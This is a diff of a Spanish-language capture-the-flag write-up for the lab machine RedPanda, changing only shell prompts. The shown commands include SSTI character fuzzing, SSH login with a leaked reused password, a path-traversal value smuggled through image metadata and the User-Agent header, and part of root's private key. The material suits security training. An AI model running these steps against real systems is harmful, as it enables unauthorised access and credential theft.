@@ -129,7 +129,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Solamente hay dos puertos abiertos, el 22 (SSH) y el 8080 (HTTP). De momento no contamos con usuarios ni credenciales para conectarnos a través de SSH. Vamos a enumerar el puerto 8080. Iniciemos usando la herramienta `whatweb` y ver qué nos reporta:
 
 ```shell
-❯ whatweb http://10.10.11.170:8080 
+rabb1t@hold:~$ whatweb http://10.10.11.170:8080 
 http://10.10.11.170:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]
 ```
 
@@ -146,7 +146,7 @@ Como vimos en el reporte que nos hizo `whatweb`, sabemos que es un buscador de p
 Nos está baneando algún caracter especial (`[$*{}]`), así que podemos hacer un script que nos muestre qué caracteres se están bloqueando, lo podemos hacer con python o con otro lenguaje. En mi caso usaré `wfuzz` de la siguiente manera:
 
 ```shell
-❯ wfuzz -c --ss 'banned characters' -w /usr/share/SecLists/Fuzzing/special-chars.txt -d 'name=FUZZ' http://10.10.11.170:8080/search
+rabb1t@hold:~$ wfuzz -c --ss 'banned characters' -w /usr/share/SecLists/Fuzzing/special-chars.txt -d 'name=FUZZ' http://10.10.11.170:8080/search
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -171,13 +171,13 @@ Requests/sec.: 14.27047
 Se destaca el comando `--ss`, el cual nos muestra solo las solicitudes en las que aparezca el parámetro dado (`banned characters`) en la respuesta. Vemos que hay 3 caracteres especiales que están siendo bloqueados. No podremos usarlos; sin embargo, el diccionario tiene 32 caracteres, nos quedarían 29 caracteres para probar una inyección. Llegados a este punto, he creado un diccionario quitando los 3 caracteres que nos están bloqueando:
 
 ```shell
-❯ grep -vE '~|\$|_' /usr/share/SecLists/Fuzzing/special-chars.txt > $(pwd)/dict.txt 
+rabb1t@hold:~$ grep -vE '~|\$|_' /usr/share/SecLists/Fuzzing/special-chars.txt > $(pwd)/dict.txt 
 ```
 
 Ahora podemos hacer un script para verificar con qué caracteres obtendremos un resultado diferente, en mi caso hice una linea en bash:
 
 ```shell
-❯ for i in $(cat dict.txt); do echo -e "Caracter: ${i}"; curl -s -d "name=${i}{7*7}" http://10.10.11.170:8080/search | grep 'You searched for: 49'; done
+rabb1t@hold:~$ for i in $(cat dict.txt); do echo -e "Caracter: ${i}"; curl -s -d "name=${i}{7*7}" http://10.10.11.170:8080/search | grep 'You searched for: 49'; done
 ```
 
 ## Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos
@@ -436,7 +436,7 @@ conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woo
 
 —¿Qué tal si se están reutilizando?— Intentemos conectarnos a través de SSH:
 ```shell
-❯ ssh woodenk@10.10.11.170
+rabb1t@hold:~$ ssh woodenk@10.10.11.170
 woodenk@10.10.11.170\'s password: RedPandazRule
 ```
 
@@ -477,7 +477,7 @@ woodenk@redpanda:/opt/panda_search$ cat redpanda.log
 
 Realicemos una petición:
 ```shell
-❯ curl http://10.10.11.170:8080/
+rabb1t@hold:~$ curl http://10.10.11.170:8080/
 ```
 
 Si volvemos a revisar el archivo de logs, nos aprece la petición:
@@ -660,7 +660,7 @@ public class App {
 
 Procedamos a decargar cualquier imagen en nuestro equipo y agregar el tag "Artist" a la metadata:
 ```shell
-❯ exiftool -Artist="/../../../../../../home/woodenk/linux.jpg"
+rabb1t@hold:~$ exiftool -Artist="/../../../../../../home/woodenk/linux.jpg"
 ```
 
 Y ahora creamos el archivo XML malicioso:
@@ -680,7 +680,7 @@ Y ahora creamos el archivo XML malicioso:
 
 Ambos archivos los transferimos a la máquina víctima. Ambos archivos los movemos al directorio home de `woodenk`. Ahora simplemente realizamos una petición desde nuestro equipo:
 ```shell
-curl http://10.10.11.170 -H 'User-Agent: ||/../../../../../../home/woodenk/linux.jpg'
+rabb1t@hold:~$ curl http://10.10.11.170 -H 'User-Agent: ||/../../../../../../home/woodenk/linux.jpg'
 ```
 
 Ahora, verifiquemos cambios en el archivo:
@@ -713,8 +713,8 @@ RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
 Tenemos la `id_rsa` del usuario `root`. La guardamos en un archivo, le damos permisos `600` y procedemos a conectarnos como este usuario:
 
 ```shell
-❯ chmod 600 id_rsa
-❯ ssh -i id_rsa root@10.10.11.170
+rabb1t@hold:~$ chmod 600 id_rsa
+rabb1t@hold:~$ ssh -i id_rsa root@10.10.11.170
 ```
 
 ¡Happy Hacking!
